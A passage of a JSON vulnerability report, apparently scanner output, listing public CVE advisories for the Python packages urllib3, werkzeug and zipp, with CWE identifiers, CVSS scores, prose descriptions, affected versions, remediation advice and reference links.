2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-37891"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"NONE","baseScore":4.4,"baseSeverity":"MEDIUM","confidentialityImpact":"HIGH","environmentalScore":4.4,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"HIGH","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"HIGH","scope":"UNCHANGED","temporalScore":4.4,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N","version":"3.1"},"products":["urllib3@vers:pypi/>=0.2|<=1.26.18"]}],"title":"CVE-2024-37891/pkg:pypi/urllib3@1.26.17"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-45803"]}],"cve":"CVE-2023-45803","cwe":{"id":"200","name":"Exposure of Sensitive Information to an Unauthorized Actor"},"discovery_date":"2023-10-17T20:15:25","ids":[{"system_name":"CVE Record","text":"CVE-2023-45803"},{"system_name":"GitHub Advisory","text":"GHSA-g4mx-q9vg-27p4"},{"system_name":"GitHub Advisory","text":"PYSEC-2023-212"},{"system_name":"Rfc-editor Advisory","text":"rfc9110"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"urllib3's request body not stripped after redirect from 303 status changes request method to GET"},{"category":"details","details":"Vulnerability Details","text":"# urllib3's request body not stripped after redirect from 303 status changes request method to GET urllib3 previously wouldn't remove the HTTP request body when an HTTP redirect response using status 303 \"See Other\" after the request had its method changed from one that could accept a request body (like `POST`) to `GET` as is required by HTTP RFCs. Although the behavior of removing the request body is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers.  From [RFC 9110 Section 9.3.1](https://www.rfc-editor.org/rfc/rfc9110.html#name-get):  > A client SHOULD NOT generate content in a GET request unless it is made directly to an origin server that has previously indicated, in or out of band, that such a request has a purpose and will be adequately supported.  ## Affected usages  Because the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren't putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn't exploitable.  Both of the following conditions must be true to be affected by this vulnerability:  * If you're using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON) * The origin service is compromised and starts redirecting using 303 to a malicious peer or the redirected-to service becomes compromised.  ## Remediation  You can remediate this vulnerability with any of the following steps:  * Upgrade to a patched version of urllib3 (v1.26.18 or v2.0.7) * Disable redirects for services that you aren't expecting to respond with redirects with `redirects=False`. * Disable automatic redirects with `redirects=False` and handle 303 redirects manually by stripping the HTTP request body.   ## Related CVE(s) CVE-2023-45803, PYSEC-2023-212"}],"product_status":{"known_affected":["urllib3@vers:pypi/>=0.2|<=1.26.17"]},"references":[{"summary":"GitHub Advisory PYSEC-2023-212","url":"https://github.com/pypa/advisory-database/tree/main/vulns/urllib3/PYSEC-2023-212.yaml"},{"summary":"GitHub Advisory GHSA-g4mx-q9vg-27p4","url":"https://github.com/urllib3/urllib3/security/advisories/GHSA-g4mx-q9vg-27p4"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4R2Y5XK3WALSR3FNAGN7JBYV2B343ZKB"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5F5CUBAN5XMEBVBZPHFITBLMJV5FIJJ5"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PPDPLM6UUMN55ESPQWJFLLIZY4ZKCNRX"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-45803"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-45803"},{"summary":"Rfc-editor Advisory rfc9110","url":"https://www.rfc-editor.org/rfc/rfc9110.html#name-get"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"ADJACENT_NETWORK","availabilityImpact":"NONE","baseScore":4.2,"baseSeverity":"MEDIUM","confidentialityImpact":"HIGH","environmentalScore":4.2,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"ADJACENT_NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"HIGH","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"HIGH","scope":"UNCHANGED","temporalScore":4.2,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:A/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N","version":"3.1"},"products":["urllib3@vers:pypi/>=0.2|<=1.26.17"]}],"title":"CVE-2023-45803/pkg:pypi/urllib3@1.26.17"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-34069"]}],"cve":"CVE-2024-34069","cwe":{"id":"352","name":"Cross-Site Request Forgery"},"discovery_date":"2024-05-06T14:21:27","ids":[{"system_name":"CVE Record","text":"CVE-2024-34069"},{"system_name":"GitHub Advisory","text":"GHSA-2g68-c3qc-8985"},{"system_name":"NetApp Advisory","text":"ntap-20240614-0004"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"Werkzeug debugger vulnerable to remote execution when interacting with attacker controlled domain"},{"category":"details","details":"Vulnerability Details","text":"# Werkzeug debugger vulnerable to remote execution when interacting with attacker controlled domain The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger."}],"product_status":{"known_affected":["werkzeug@vers:pypi/>=0.1|<=3.0.2"]},"references":[{"summary":"GitHub Advisory GHSA-2g68-c3qc-8985","url":"https://github.com/pallets/werkzeug/security/advisories/GHSA-2g68-c3qc-8985"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/H4SH32AM3CTPMAAEOIDAN7VU565LO4IR"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HFERFN7PINV4MOGMGA3DPIXJPDCYOEJZ"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-34069"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-34069"},{"summary":"NetApp Advisory ntap-20240614-0004","url":"https://security.netapp.com/advisory/ntap-20240614-0004"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"HIGH","baseScore":7.5,"baseSeverity":"HIGH","confidentialityImpact":"HIGH","environmentalScore":7.5,"environmentalSeverity":"HIGH","integrityImpact":"HIGH","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"HIGH","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":7.5,"temporalSeverity":"HIGH","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H","version":"3.1"},"products":["werkzeug@vers:pypi/>=0.1|<=3.0.2"]}],"title":"CVE-2024-34069/pkg:pypi/werkzeug@2.3.6"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-46136"]}],"cve":"CVE-2023-46136","cwe":{"id":"400","name":"Uncontrolled Resource Consumption"},"discovery_date":"2023-10-25T14:22:59","ids":[{"system_name":"CVE Record","text":"CVE-2023-46136"},{"system_name":"GitHub Advisory","text":"GHSA-hrfv-mqp8-q5rw"},{"system_name":"GitHub Advisory","text":"PYSEC-2023-221"},{"system_name":"NetApp Advisory","text":"ntap-20231124-0008"}],"notes":[{"audience":"developers","category":"other","text":"Out-of-bounds Write","title":"Additional CWE: 787"},{"category":"description","details":"Vulnerability Description","text":"Werkzeug DoS: High resource usage when parsing multipart/form-data containing a large part with CR/LF character at the beginning"},{"category":"details","details":"Vulnerability Details","text":"# Werkzeug DoS: High resource usage when parsing multipart/form-data containing a large part with CR/LF character at the beginning Werkzeug multipart data parser needs to find a boundary that may be between consecutive chunks. That's why parsing is based on looking for newline characters. Unfortunately, code looking for partial boundary in the buffer is written inefficiently, so if we upload a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer.  This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. If many concurrent requests are sent continuously, this can exhaust or kill all available workers.   ## Related CVE(s) CVE-2023-46136, PYSEC-2023-221"}],"product_status":{"known_affected":["werkzeug@vers:pypi/>=0.1|<=2.3.7"]},"references":[{"summary":"GitHub Advisory GHSA-hrfv-mqp8-q5rw","url":"https://github.com/pallets/werkzeug/security/advisories/GHSA-hrfv-mqp8-q5rw"},{"summary":"GitHub Advisory PYSEC-2023-221","url":"https://github.com/pypa/advisory-database/tree/main/vulns/werkzeug/PYSEC-2023-221.yaml"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-46136"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-46136"},{"summary":"NetApp Advisory ntap-20231124-0008","url":"https://security.netapp.com/advisory/ntap-20231124-0008"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"ADJACENT_NETWORK","availabilityImpact":"HIGH","baseScore":5.7,"baseSeverity":"MEDIUM","confidentialityImpact":"NONE","environmentalScore":5.7,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"LOW","modifiedAttackVector":"ADJACENT_NETWORK","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"LOW","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"LOW","scope":"UNCHANGED","temporalScore":5.7,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H","version":"3.1"},"products":["werkzeug@vers:pypi/>=0.1|<=2.3.7"]}],"title":"CVE-2023-46136/pkg:pypi/werkzeug@2.3.6"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-5569"]}],"cve":"CVE-2024-5569","cwe":{"id":"400","name":"Uncontrolled Resource Consumption"},"discovery_date":"2024-07-09T00:31:40","ids":[{"system_name":"CVE Record","text":"CVE-2024-5569"},{"system_name":"Huntr Advisory","text":"be898306-11f9-46b4-b28c-f4c4aa4ffbae"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"zipp Denial of Service vulnerability"},{"category":"details","details":"Vulnerability Details","text":"# zipp Denial of Service vulnerability A Denial of Service (DoS) vulnerability exists in the jaraco/zipp library, affecting all versions prior to 3.19.1. The vulnerability is triggered when processing a specially crafted zip file that leads to an infinite loop. This issue also impacts the zipfile module of CPython, as features from the third-party zipp library are later merged into CPython, and the affected code is identical in both projects. The infinite loop can be initiated through the use of functions affecting the `Path` module in both zipp and zipfile, such as `joinpath`, the overloaded division operator, and `iterdir`. Although the infinite loop is not resource exhaustive, it prevents the application from responding. The vulnerability was addressed in version 3.19.1 of jaraco/zipp."}],"product_status":{"known_affected":["zipp@vers:pypi/>=0.1.0|<=3.19.0"],"known_not_affected":["zipp@3.19.1"]},"references":[{"summary":"Huntr Advisory be898306-11f9-46b4-b28c-f4c4aa4ffbae","url":"https://huntr.com/bounties/be898306-11f9-46b4-b28c-f4c4aa4ffbae"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-5569"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-5569"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"LOCAL","availabilityImpact":"HIGH","baseScore":6.2,"baseSeverity":"MEDIUM","confidentialityImpact":"NONE","environmentalScore":6.2,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"LOW","modifiedAttackVector":"LOCAL","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":6.2,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H","version":"3.0"},"products":["zipp@vers:pypi/>=0.1.0|<=3.19.0"]}],"title":"CVE-2024-5569/pkg:pypi/zipp@3.15.0"}]}